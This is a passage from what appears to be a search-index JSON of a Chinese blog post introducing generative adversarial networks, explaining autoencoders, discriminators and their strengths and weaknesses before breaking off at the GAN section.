<p>\u4e0a\u56fe\u662f\u4e00\u4e2a\u5411\u91cf\u751f\u6210\u56fe\u7247\u7684\u4f8b\u5b50\u3002\u5411\u91cf\u6309\u7167\u4e00\u79cd\u987a\u5e8f\u5728\u9010\u6e10\u53d8\u5316\uff0c\u6211\u4eec\u800c\u53ef\u4ee5\u770b\u5230\u7b2c\u56db\u884c\u751f\u6210\u7684\u4eba\u8138\u4e5f\u5728\u53d8\u5316\u3002\u60ca\u4eba\u7684\u662f\uff0c\u5b83\u7684\u751f\u6210\u7adf\u7136\u662f\u4e00\u4e2a\u8fde\u7eed\u7684\u5c06\u8138\u53d8\u6362\u4e00\u4e2a\u671d\u5411\u7684\u8fc7\u7a0b\u3002\u8fd9\u8bf4\u660e\uff0c\u8fd9\u4e2a\u6a21\u578b\u786e\u5b9e\u5b66\u5230\u4e86\u8fd9\u4e2a\u4eba\u7684\u8138\u7684\u6df1\u523b\u7279\u5f81\uff0c\u80fd\u6839\u636e\u5411\u91cf\u7684\u5fae\u8c03\uff0c\u5bf9\u4ea7\u751f\u7684\u7ed3\u679c\u4e5f\u751f\u6210\u8fde\u8d2f\u4e00\u81f4\u7684\u5fae\u8c03\u3002</p> <p>\u4e0d\u53ea\u662f\u7ed8\u753b\uff0c\u5f53\u5b83\u8fd8\u80fd\u751f\u6210\u8bed\u8a00\uff0c\u751f\u6210\u7535\u5f71\uff0c\u751f\u6210\u4ee3\u7801\uff0c\u751f\u6210\u7535\u8def\u8bbe\u8ba1\uff0c\u751f\u6210\u79d1\u5b66\u7406\u8bba\u65f6\uff0c\u5b83\u4f53\u73b0\u51fa\u6765\u7684\u667a\u80fd\u6027\u662f\u975e\u5e38\u8ba9\u4eba\u9707\u64bc\u7684\u3002\u5b66\u4e60\u5230\u5bf9\u8c61/\u6982\u5ff5\u7684\u6df1\u5c42\u6b21\u5185\u6db5\uff0c\u5e76\u4e14\u80fd\u591f\u4f7f\u7528\u8fd9\u4e9b\u5b66\u5230\u7684\u77e5\u8bc6\u53bb\u521b\u9020\u672a\u77e5\u7684\u4e1c\u897f\uff0c\u8fd9\u662f\u4eba\u5de5\u667a\u80fd\u7684\u7a76\u6781\u76ee\u6807\u4e4b\u4e00\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#auto-encoder","title":"Auto-encoder","text":""},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#basic-idea","title":"Basic Idea","text":"<p>\u4e0a\u56fe\u662f\u751f\u6210\u6a21\u578b\u7684\u4e00\u79cd\u57fa\u672c\u6a21\u5f0f\uff0c\u6211\u4eec\u5e0c\u671b\u8f93\u5165\u4e00\u4e2a\u5411\u91cf\u5f97\u5230\u4e00\u4e2a\u76ee\u6807\u8f93\u51fa\u4f5c\u4e3a\u56fe\u5f62\u3002</p> <p>\u4e00\u4e2a\u7b80\u5355\u95ee\u9898\u662f\uff0c\u6211\u4eec\u5982\u4f55\u8bad\u7ec3\u5b83\uff1f\u5bb9\u6613\u60f3\u5230\u7684\u662f\u4e8b\u5148\u51c6\u5907\u4e00\u5806\u5411\u91cf\u548c\u56fe\u7247\u4e4b\u95f4\u7684\u6620\u5c04\u5bf9\uff0c\u8ba9\u8fd9\u4e2a\u751f\u6210\u5668\u5b66\u5f97\u67d0\u79cd\u6620\u5c04\u6a21\u5f0f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4f46\u9762\u4e34\u7684\u4e00\u4e2a\u73b0\u5b9e\u95ee\u9898\u662f\uff0c\u7528\u4e8e\u8bad\u7ec3\u7684\u56fe\u7247\u5f88\u5bb9\u6613\u5f97\u5230\uff0c\u4f46\u662f\u8fd9\u4e2a\u5411\u91cf code \u5982\u4f55\u5f97\u5230\uff1f\u9700\u8981\u6211\u4eec\u624b\u5de5\u8bbe\u7f6e\u5417\uff1f\u5bf9\u4e8e\u4e00\u4e9b\u5927\u578b\u7684\u9879\u76ee\uff0c\u8fd9\u4e2a\u5411\u91cf\u4e00\u822c\u7ef4\u5ea6\u5f88\u9ad8\uff0c\u6837\u4f8b\u4e5f\u5f88\u591a\uff0c\u624b\u5de5\u8bbe\u7f6e\u8fd9\u4e9b\u5411\u91cf\u6807\u7b7e\u53ef\u64cd\u4f5c\u6027\u5e76\u4e0d\u5f3a\u3002\u5e76\u4e14\uff0c\u5982\u679c\u8bbe\u8ba1\u7684\u5411\u91cf\u4e0d\u597d\uff0c\u4e5f\u5f88\u96be\u4fdd\u8bc1\u6a21\u578b\u6536\u655b\u3002</p> <p>\u81ea\u7f16\u7801\u5668\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff1a</p> <p></p> <p></p> <p>\u5982\u56fe\uff0c\u81ea\u7f16\u7801\u5668\u63a5\u6536\u4e00\u5f20\u56fe\u7247\u4f5c\u4e3a\u8f93\u5165\uff0c\u5148\u4e22\u5165\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\u4e2d\u4ea7\u751f\u4e00\u4e2a\u7f16\u7801\u4f5c\u4e3a\u8f93\u51fa\uff08\u4e00\u4e2a\u9ad8\u7ef4\u5411\u91cf\uff09\uff0c\u8fd9\u4e2a\u4ea7\u751f\u7684\u7f16\u7801\u518d\u88ab\u4e22\u5165\u53e6\u5916\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6062\u590d\u6210\u56fe\u7247\u3002\u6211\u4eec\u5e0c\u671b\u6062\u590d\u51fa\u6765\u7684\u56fe\u7247\u5c3d\u53ef\u80fd\u548c\u8f93\u5165\u7684\u56fe\u7247\u76f8\u8fd1\uff0c\u4e8e\u662f\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a loss \u6765\u8861\u91cf\u56fe\u7247\u5728\u8fd9\u4e00\u6b21\u7f16\u7801\u548c\u89e3\u7801\u8fc7\u7a0b\u4e2d\u7684\u635f\u5931\uff0c\u6839\u636e\u8fd9\u4e2a loss\uff0c\u518d\u4f7f\u7528\u50cf\u68af\u5ea6\u4e0b\u964d\u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u5c31\u53ef\u4ee5\u8c03\u6574 encoder \u548c decoder \u7684\u53c2\u6570\uff0c\u4f7f\u5f97\u5176\u5c3d\u53ef\u80fd\u51cf\u5c11\u635f\u5931\u3002</p> <p>\u5728\u8fd9\u6837\u4e00\u4e2a\u81ea\u7f16\u7801\uff0c\u81ea\u89e3\u7801\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5c31\u65e2\u6709\u4e86\u7f16\u7801\u5668\u548c\u89e3\u7801\u5668\u3002\u6211\u4eec\u53ef\u4ee5\u53ea\u5bf9\u89e3\u7801\u5668\u8f93\u5165\u5411\u91cf\uff0c\u5c31\u80fd\u5f97\u5230\u4e00\u4e2a\u751f\u6210\u56fe\u3002\u9700\u8981\u6ce8\u610f\u5230\u7684\u662f\uff0c\u5728\u8fd9\u6837\u4e00\u4e2a\u81ea\u7f16\u7801\u5668\u6a21\u578b\u4e2d\uff0ccode \u548c image \u7684\u6620\u5c04\u5b8c\u5168\u662f\u7531\u6a21\u578b\u751f\u6210\u7684\u3002\u6a21\u578b\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u8c03\u4f18\u8fd9\u4e2a\u6620\u5c04\u7684\u5212\u5206\u3002</p> <p>PS : \u8fd9\u4e2a code \u7684\u957f\u5ea6\u662f\u4e00\u4e2a\u8d85\u53c2\u6570\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u5b9a\u4e00\u4e2a\u9002\u5408\u7684\u7f16\u7801\u957f\u5ea6\u3002\u4e00\u65b9\u9762\uff0c\u5b83\u7684\u957f\u5ea6\u5c0f\u4e8e\u539f\u56fe\u624d\u80fd\u8fbe\u5230\u6211\u4eec\u5e0c\u671b\u7684\u63d0\u53d6\u7279\u5f81\u7684\u6548\u679c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5b83\u7684\u957f\u5ea6\u592a\u5c0f\uff0c\u53ef\u80fd\u65e0\u6cd5\u5bb9\u7eb3\u56fe\u7247\u4e2d\u5fc5\u987b\u7684\u4e00\u4e9b\u5173\u952e\u4fe1\u606f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8fd8\u539f\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#pros-and-cons","title":"Pros and Cons","text":"<p>\u81ea\u52a8\u7f16\u7801\u5668\u7684\u4f18\u70b9\u5f88\u663e\u7136\uff0c\u53ea\u9700\u8981\u7ed9\u6a21\u578b\u5c55\u793a\u4e00\u4e9b\u6b63\u4f8b\uff0c\u5b83\u5c31\u80fd\u5b66\u5230\u7f16\u7801\u4e0e\u56fe\u7247\u4e4b\u95f4\u7684\u6620\u5c04\uff0c\u975e\u5e38\u6613\u4e8e\u8bad\u7ec3\u548c\u751f\u6210\u3002</p> <p>\u4e0a\u9762\u6211\u4eec\u8bf4\u4e86\uff0c\u6211\u4eec\u5728\u8bad\u7ec3\u4e00\u4e2a\u81ea\u7f16\u7801\u5668\u7684\u65f6\u5019\uff0c\u5e0c\u671b\u7684\u662f\u8f93\u51fa\u56fe\u7247\u548c\u8f93\u5165\u56fe\u7247\u5c3d\u53ef\u80fd\u7684\u76f8\u8fd1\uff0c\u51cf\u5c11\u635f\u5931\u3002\u8fd9\u4e2a\u76f8\u4f3c\u5982\u4f55\u53bb\u8861\u91cf\u5462\uff1f\u4e00\u822c\u91c7\u7528\u7684\u65b9\u6cd5\u90fd\u662f\u628a\u56fe\u7247\u5f53\u4f5c\u9ad8\u7ef4\u5411\u91cf\u5904\u7406\uff0c\u6c42\u4e24\u4e2a\u5411\u91cf\u4e4b\u95f4\u8ddd\u79bb\u7684 L1 \u6216\u8005 L2 \u8303\u6570\u3002\u8fd9\u4e2a\u8303\u6570\u5c31\u8868\u5f81\u4e86\u4e24\u5f20\u56fe\u7247\u4e4b\u95f4\u7684\u5dee\u522b\uff0c\u800c\u8fd9\u6837\u7684\u8861\u91cf\u65b9\u5f0f\u5c40\u9650\u6027\u5f88\u660e\u663e\uff1a</p> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u5982\u679c\u6211\u4eec\u8ba9\u673a\u5668\u751f\u6210\u4e86\u56db\u4e2a\u7248\u672c\u7684\u201c2\u201d\u7684\u56fe\u7247\u3002\u5176\u4e2d v1 \u548c v2 \u4e0e\u539f\u56fe\u53ea\u5dee\u4e86\u4e00\u4e2a\u50cf\u7d20\u70b9\uff0cv3 \u548c v4 \u67e5\u4e86\u8db3\u8db3 6 \u4e2a\u50cf\u7d20\u70b9\u3002\u4f46\u662f v1 \u548c v2 \u7834\u7efd\u5f88\u660e\u663e\uff0cv1 \u5728\u5c3e\u5df4\u4e0a\u51fa\u73b0\u4e86\u4e00\u4e2a\u5b64\u7acb\u7684\u6a58\u8272\u5757\uff0c\u800c v2 \u5728\u4e2d\u95f4\u7559\u4e86\u4e00\u5757\u767d\u51fa\u6765\uff0c\u8fd9\u90fd\u662f\u4e0d\u81ea\u7136\u7684\u3002\u800c v3 \u548c v4 \u867d\u7136\u50cf\u7d20\u70b9\u5dee\u8ddd\u66f4\u5927\uff0c\u4f46\u662f\u5176\u5b9e\u53ea\u662f\u5c3e\u5df4\u548c\u5934\u5206\u522b\u62c9\u957f\u4e86\u4e00\u70b9\u7f62\u4e86\uff0c\u8fd9\u90fd\u662f\u5f88\u6b63\u5e38\u7684\u60c5\u51b5\u3002\u6240\u4ee5\uff0c\u7528\u8fd9\u79cd\u6807\u51c6\u8bad\u7ec3\u51fa\u6765\u7684\u6a21\u578b\uff0c\u5b83\u663e\u7136\u7f3a\u5c11\u4e00\u4e2a\u5927\u5c40\u89c2\u3002\u53ea\u662f\u673a\u68b0\u7684\u5206\u522b\u5173\u6ce8\u5168\u5c40\u5bf9\u8c61\u7684\u6bcf\u4e00\u4e2a\u5c0f\u7ec4\u6210\u90e8\u5206\uff0c\u5f88\u96be\u5b66\u5230\u7ec4\u6210\u90e8\u5206\u4e4b\u95f4\u7684\u5173\u8054\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#discriminator","title":"Discriminator","text":""},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#basic-idea_1","title":"Basic Idea","text":"<p>\u8bc4\u4f30\u5668\u63a5\u6536\u4e00\u4e2a\u5bf9\u8c61\u8f93\u5165\uff0c\u4ea7\u751f\u4e00\u4e2a\u6807\u91cf\u8f93\u51fa\u3002\uff08\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u56de\u5f52\u95ee\u9898\uff09\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u4ee5\u751f\u6210\u56fe\u7247\u7684\u4efb\u52a1\u4e3a\u4f8b\uff0c\u4e00\u4e2a\u8bc4\u4f30\u5668\u4f1a\u8bc4\u4f30\u673a\u5668\u751f\u6210\u7684\u56fe\u7247\u662f\u5426\u548c\u4eba\u7c7b\u4f5c\u51fa\u6765\u7684\u56fe\u6709\u4e00\u6837\u7684\u6548\u679c\uff0c\u6839\u636e\u751f\u6210\u8d28\u91cf\uff0c\u8bc4\u4f30\u5668\u4f1a\u7ed9\u51fa\u4e00\u4e2a 0~1 \u7684\u8bc4\u5206\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u4e00\u4e2a\u5f88\u597d\u7684\u8bc4\u4f30\u5668\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528\u62ff\u5b83\u6765\u751f\u6210\u56fe\u7247\u3002\u7ed9\u5b9a\u4e00\u4e2a\u5411\u91cf\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e9b\u4e8b\u5148\u6784\u9020\u7684\u5047\u8bbe\uff0c\u5c06\u5176\u53ef\u80fd\u5bf9\u5e94\u7684\u56fe\u7247\u9501\u5b9a\u5728\u4e00\u4e2a\u96c6\u5408\uff08\u53ef\u80fd\u4f1a\u5f88\u5927\uff09\u4e2d\u3002\u56fe\u7247\u751f\u6210\u5c31\u6210\u4e3a\u4e86\u5728\u8fd9\u4e2a\u96c6\u5408\u4e2d\u679a\u4e3e\uff0c\u7b5b\u9009\u51fa\u4e00\u4e2a\u5f97\u5206\u6700\u9ad8\u7684\u56fe\u7247\uff1a</p> <p></p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#train","title":"Train","text":"<p>\u4e00\u4e2a\u5b9e\u9645\u7684\u95ee\u9898\u662f\uff0c\u5982\u4f55\u8bad\u7ec3\u4e00\u4e2a\u597d\u7684\u8bc4\u4f30\u5668\uff1f\u5b83\u600e\u4e48\u80fd\u5206\u8fa8\u51fa\u54ea\u4e9b\u662f\u753b\u5f97\u597d\u7684\uff0c\u54ea\u4e9b\u662f\u753b\u5f97\u7cdf\u7cd5\u7684\uff1f</p> <p></p> <p></p> <p>\u5728\u7f51\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0b\u8f7d\u4e00\u5927\u5806\u827a\u672f\u5bb6\u7ed8\u5236\u7684\u56fe\u7247\uff0c\u4ed6\u4eec\u90fd\u53ef\u4ee5\u62ff\u6765\u4f5c\u4e3a\u6b63\u4f8b\uff0c\u7528\u6765\u8ba9\u6a21\u578b\u5b66\u4e60\u4ec0\u4e48\u662f\u201c\u597d\u201d\u56fe\u7247\u3002\u4f46\u662f\u5982\u679c\u5168\u90fd\u662f\u6b63\u4f8b\uff0c\u90a3\u4e48\u8bc4\u4f30\u5668\u5c06\u4f1a\u6536\u655b\u4e3a\u4e00\u4e2a\u6052\u8f93\u51fa 1 \u7684\u5e38\u51fd\u6570\u3002\u6240\u4ee5\uff0c\u8981\u8bad\u7ec3\u4e00\u4e2a\u8bc4\u4f30\u5668\uff0c\u9762\u4e34\u7684\u4e00\u4e2a\u5b9e\u9645\u95ee\u9898\u662f\uff1a\u5982\u4f55\u83b7\u5f97\u597d\u7684\u53cd\u4f8b\uff1f</p> <p>\u5982\u679c\u53cd\u4f8b\u7684\u91c7\u6837\u5206\u5e03\u6ca1\u6709\u9009\u597d\uff0c\u90a3\u4e48\u6a21\u578b\u5bf9\u53cd\u4f8b\u7684\u8bc6\u522b\u80fd\u529b\u4e5f\u4f1a\u5f88\u5dee\u3002\u5c31\u4f1a\u50cf\u4e0a\u56fe\u90a3\u6837\uff0c\u4e00\u4e2a\u753b\u5f97\u5f88\u4e00\u822c\u7684\u56fe\u7247\u5374\u83b7\u5f97\u4e86 0.9 \u7684\u9ad8\u5206\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u8fed\u4ee3\u7b97\u6cd5\u6765\u4e0d\u65ad\u5f3a\u5316\u8fd9\u4e2a\u8bc4\u4f30\u5668\uff1a</p> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\u3002\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u53ef\u4ee5\u968f\u673a\u751f\u6210\u4e00\u6279\u53cd\u4f8b\uff0c\u7136\u540e\u6211\u4eec\u7528\u5f53\u524d\u7684\u6b63\u4f8b\u548c\u53cd\u4f8b\u8bad\u7ec3\u51fa\u6765\u4e00\u4e2a\u8bc4\u4f30\u5668\u3002\u8bc4\u4f30\u5668\u662f\u4e2a\u4ec0\u4e48\u4e1c\u897f\u5462\uff1f\u5b83\u672c\u8d28\u4e0a\u4e5f\u662f\u4e00\u4e2a\u5b9a\u4e49\u5728\u56fe\u7247\u57df\u4e0a\u7684\u51fd\u6570\u3002\u6211\u4eec\u73b0\u5728\u5c31\u4ece\u8fd9\u4e2a\u5b9a\u4e49\u57df\u4e0a\u91c7\u96c6\u4e00\u6279\u8bc4\u5206\u5f88\u9ad8\u7684\u56fe\u7247\u6765\u4f5c\u4e3a\u53cd\u4f8b\uff0c\u7528\u65b0\u7684\u53cd\u4f8b\u7ed3\u5408\u4e4b\u524d\u7684\u6b63\u4f8b\u91cd\u65b0\u8bad\u7ec3\uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a\u7248\u672c\u7684\u8bc4\u4f30\u5668\u3002\u6700\u540e\u4e0d\u65ad\u8fed\u4ee3\u3002</p> <p></p> <p>\u4e0a\u56fe\u662f\u4e00\u4e2a\u8fed\u4ee3\u8fc7\u7a0b\u7684\u793a\u610f\u56fe\uff0c\u7eff\u8272\u4e3a\u771f\u5b9e\u56fe\u7247\u7684\u5206\u5e03\u57df\uff0c\u84dd\u8272\u4e3a\u751f\u6210\u7684\u6548\u679c\u7cdf\u7cd5\u7684\u56fe\u7247\u7684\u5206\u5e03\u57df\uff0c\u7ea2\u8272\u66f2\u7ebf\u662f\u6211\u4eec\u7684\u8bc4\u4f30\u51fd\u6570\u3002\u5728\u7b2c\u4e00\u8f6e\u7684\u8bad\u7ec3\u4e2d\uff0c\u771f\u5b9e\u57df\u7684\u51fd\u6570\u4f30\u503c\u4f1a\u88ab\u62c9\u9ad8\uff0c\u6211\u4eec\u968f\u673a\u751f\u6210\u90a3\u4e9b\u566a\u97f3\u56fe\u7247\u6240\u5728\u7684\u57df\u7684\u80a1\u6307\u4f1a\u88ab\u538b\u4f4e\u3002\u4f46\u662f\u8fd9\u4e2a\u4f30\u503c\u51fd\u6570\u53ef\u80fd\u8fd8\u4e0d\u591f\uff0c\u5b83\u53ef\u80fd\u6ca1\u6709\u53d1\u73b0\u5176\u5b83\u5f88\u7cdf\u7cd5\u7684\u56fe\u7247\u7684\u5206\u5e03\u57df\uff0c\u7ed9\u4e86\u5b83\u4eec\u5f88\u9ad8\u7684\u4f30\u503c\uff0c\u6211\u4eec\u79f0\u4e3a\u201c\u865a\u9ad8\u201d\u3002\u6240\u4ee5\u6211\u4eec\u4f1a\u8fdb\u884c\u7b2c\u4e8c\u8f6e\u8bad\u7ec3\uff0c\u7b2c\u4e8c\u8f6e\u4e2d\u7528\u5230\u7684\u53cd\u4f8b\u662f\u4ece\u7b2c\u4e00\u8f6e\u8bad\u7ec3\u51fa\u6765\u7684\u4f30\u503c\u51fd\u6570\u4e2d\u91c7\u6837\u7684\u4f30\u503c\u9ad8\u7684\u70b9\uff0c\u90a3\u4e9b\u201c\u865a\u9ad8\u201d\u7684\u70b9\u56e0\u4e3a\u88ab\u4f5c\u4e3a\u53cd\u4f8b\u88ab\u538b\u4f4e\uff0c\u800c\u90a3\u4e9b\u672c\u6765\u5c31\u8be5\u5f97\u5206\u9ad8\u7684\u70b9\u5373\u4f7f\u88ab\u91c7\u6837\u4e3a\u53cd\u4f8b\uff0c\u4f46\u662f\u56e0\u4e3a\u6709\u540c\u533a\u57df\u7684\u6b63\u4f8b\u5728\u652f\u6491\uff0c\u6240\u4ee5\u8fd9\u4e00\u533a\u57df\u7684\u4f30\u503c\u4e0d\u4f1a\u88ab\u538b\u4f4e\u3002\u6700\u540e\uff0c\u591a\u8f6e\u8fed\u4ee3\u540e\uff0c\u90a3\u4e9b\u865a\u9ad8\u7684\u70b9\u5c31\u4f1a\u9010\u6e10\u88ab\u538b\u5e73\uff0c\u53ea\u6709\u6b63\u4f8b\u5206\u5e03\u7684\u533a\u57df\u8fd8\u4f9d\u65e7\u575a\u633a\u3002\u6b64\u65f6\u6211\u4eec\u5c31\u8ba4\u4e3a\u5f97\u5230\u7684\u8bc4\u4f30\u51fd\u6570\u662f\u4f18\u79c0\u7684\u3002</p> <p>\u8fd9\u5c31\u50cf\u662f\u5236\u5b9a\u4e00\u90e8\u6cd5\u5f8b\u3002\u6211\u4eec\u5e0c\u671b\u4eba\u4eec\u7684\u884c\u4e3a\u88ab\u7ea6\u675f\u5728\u4e00\u4e2a\u6211\u4eec\u9884\u5148\u5b9a\u4e49\u7684\u53ef\u63a5\u53d7\u7684\u8303\u56f4\u5185\u3002\u4f46\u662f\u6cd5\u5f8b\u6709\u6f0f\u6d1e\uff0c\u603b\u6709\u4eba\u94bb\u7a7a\u5b50\uff0c\u5728\u5236\u5b9a\u8005\u671f\u671b\u4e4b\u5916\u7684\u533a\u57df\u83b7\u5f97\u5f88\u9ad8\u7684\u6536\u76ca\u3002\u6cd5\u5f8b\u5236\u5b9a\u8005\u5c31\u4f1a\u9501\u5b9a\u8fd9\u4e9b\u7a81\u51fa\u7684\u9886\u57df\u4e13\u95e8\u6307\u5b9a\u65b0\u7684\u6761\u4ee4\u6765\u6253\u51fb\u3002\u7ecf\u8fc7\u4e0d\u65ad\u7684\u5b9e\u8df5\u548c\u4fee\u8ba2\uff0c\u8fd9\u90e8\u6cd5\u5f8b\u4e5f\u5c31\u5b8c\u5584\u8d77\u6765\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#pros-and-cons_1","title":"Pros and Cons","text":"<p>\u4f30\u503c\u5668\u7684\u4f18\u70b9\u6b63\u597d\u5f25\u8865\u4e86\u81ea\u52a8\u7f16\u7801\u5668\u7684\u7f3a\u70b9\u3002\u81ea\u52a8\u7f16\u7801\u5668\u662f\u4e00\u4e2a Button Up \u7684\u6a21\u578b\uff0c\u5b83\u6839\u636e\u7f16\u7801\u5bf9\u6bcf\u4e00\u4e2a\u50cf\u7d20\u70b9\u5355\u72ec\u751f\u6210\uff0c\u7ec4\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u66f4\u9ad8\u5c42\u7684\u7ed3\u679c\uff0c\u8fd9\u6837\u7684 Button Up \u6a21\u578b\u5f88\u96be\u5b66\u5230\u4e0d\u540c\u7ec4\u6210\u90e8\u5206\u4e4b\u95f4\u7684\u5173\u8054\u3002\u800c\u4f30\u503c\u5668\u662f\u4e00\u4e2a Top Down \u6a21\u578b\uff0c\u5b83\u76f4\u63a5\u83b7\u5f97\u6b63\u5e38\u56fe\u7247\u4f5c\u4e3a\u8f93\u5165\uff0c\u7528\u5168\u8fde\u63a5\u7f51\u7edc\u6216\u8005\u5377\u79ef\u7f51\u7edc\u5f88\u5bb9\u6613\u5b66\u4e60\u56fe\u7247\u4e2d\u7684\u4e00\u4e9b\u5c40\u90e8\u4ee5\u53ca\u5168\u5c40\u7279\u5f81\u3002</p> <p>\u4f46\u662f\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\u3002\u4ece\u4e0a\u9762\u770b\u5230\uff0c\u6211\u4eec\u53d1\u73b0\u8bc4\u4f30\u5668\u5f88\u4f9d\u8d56\u4e8e\u4e00\u4e2a argmax \u7684\u8ba1\u7b97\u3002\u5982\u679c\u8981\u7528\u5b83\u6765\u751f\u6210\u6a21\u578b\uff0c\u6211\u4eec\u9700\u8981\u5728\u4e00\u4e2a\u57df\u4e0a\u627e\u5230\u5f97\u5206\u6700\u9ad8\u7684\u5019\u9009\u56fe\u3002\u5982\u679c\u8981\u7528\u8fed\u4ee3\u6cd5\u6765\u8bad\u7ec3\u4e00\u4e2a\u8bc4\u4f30\u5668\uff0c\u6211\u4eec\u4e5f\u9700\u8981\u5728\u5f53\u524d\u7684\u8bc4\u4f30\u51fd\u6570\u57df\u91c7\u6837\u4f30\u503c\u9ad8\u7684\u70b9\u6765\u4f5c\u4e3a\u65b0\u7684\u53cd\u4f8b\u3002\u7136\u800c\u8fd9\u4e2a argmax \u600e\u4e48\u7b97\u5462\uff1f\u5f88\u591a\u7528 discriminator \u6765\u505a\u751f\u6210\u7684\uff0c\u90fd\u8981\u4e8b\u5148\u505a\u4e00\u4e9b\u4e0d\u51c6\u786e\u7684\u5047\u8bbe\uff0c\u6839\u636e\u8fd9\u4e9b\u5047\u8bbe\u5bf9\u4e0d\u540c\u7684\u8f93\u5165\u5411\u91cf\u5728\u56fe\u7247\u57df\u4e2d\u5212\u5206\u4e00\u4e2a\u5019\u9009\u57df\uff0c\u5728\u8fd9\u4e2a\u53ef\u884c\u57df\u4e0a\u505a argmax\u3002\u5e76\u4e14\u6709\u7684\u65f6\u5019\u9700\u8981\u5927\u91cf\u7684\u679a\u4e3e\uff0c\u975e\u5e38\u8017\u65f6\u3002\u5e76\u4e14\u8981\u8bad\u7ec3\u8bc4\u4f30\u5668\u4e5f\u4e0d\u5bb9\u6613\uff0c\u5149\u6709\u6b63\u4f8b\u8fd8\u4e0d\u884c\uff0c\u8fd8\u5f97\u81ea\u5df1\u53bb\u5408\u7406\u7684\u751f\u6210\u53cd\u4f8b\u3002</p> <p>\u6240\u4ee5\uff0c\u663e\u800c\u6613\u89c1\uff0c\u8bc4\u4f30\u5668\u867d\u7136\u6709\u4e86\u81ea\u7f16\u7801\u5668\u96be\u4ee5\u5b66\u5f97\u7684\u5168\u5c40\u89c2\uff0c\u4f46\u662f\u5374\u6ca1\u4e86\u81ea\u7f16\u7801\u5668\u90a3\u79cd\u6613\u4e8e\u751f\u6210\u7ed3\u679c\u7684\u7279\u6027\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#gan","title":"GAN","text":"<p>\u8ba8\u8bba\u4e86\u8fd9\u4e48\u591a\uff0c\u7ec8\u4e8e\u8f6e\u5230\u4e3b\u4eba\u516c GAN \u767b\u573a\u4e86\u3002</p> <p>\u524d\u9762\u6211\u4eec\u5148\u8ba8\u8bba\u4e86 Auto-encoder \u548c Discriminator\uff0c\u5206\u522b\u4ecb\u7ecd\u4e86\u7528\u5b83\u4eec\u6765\u505a\u751f\u6210\u7684\u57fa\u672c\u60f3\u6cd5\u3002\u5728\u8ba8\u8bba\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u610f\u8bc6\u5230\u4e86\uff1aAuto-encoder \u5f88\u5bb9\u6613\u4ea7\u751f\u751f\u6210\u56fe\u50cf\uff0c\u4f46\u662f\u7531\u4e8e\u662f button-up \u7684\u6a21\u578b\uff0c\u6839\u636e\u7f16\u7801\u5206\u522b\u5bf9\u6bcf\u4e00\u4e2a\u50cf\u7d20\u70b9\u9884\u6d4b\uff0c\u5f88\u96be\u5b66\u5f97\u50cf\u7d20\u70b9\u4e4b\u95f4\u7684\u5173\u7cfb\uff1bDiscriminator \u5f88\u5bb9\u6613\u5b66\u5f97\u56fe\u50cf\u4e2d\u4e00\u4e9b\u5c40\u90e8\u548c\u5168\u5c40\u7684\u7279\u5f81\u7ec6\u8282\uff0c\u53ef\u4ee5\u5f88\u597d\u7684\u5904\u7406\u50cf\u7d20\u70b9\u4e4b\u95f4\u7684 correlation\uff0c\u4f46\u662f\u5176\u4e3b\u8981\u80fd\u529b\u8fd8\u662f\u5728\u505a\u8bc4\u4f30\u4e0a\uff0c\u5728\u751f\u6210\u65b9\u9762\u5b83\u8fd8\u662f\u7f3a\u4e4f\u4e00\u4e2a\u6709\u6548\u7684\u751f\u6210\u624b\u6bb5\u3002</p> <p>GAN 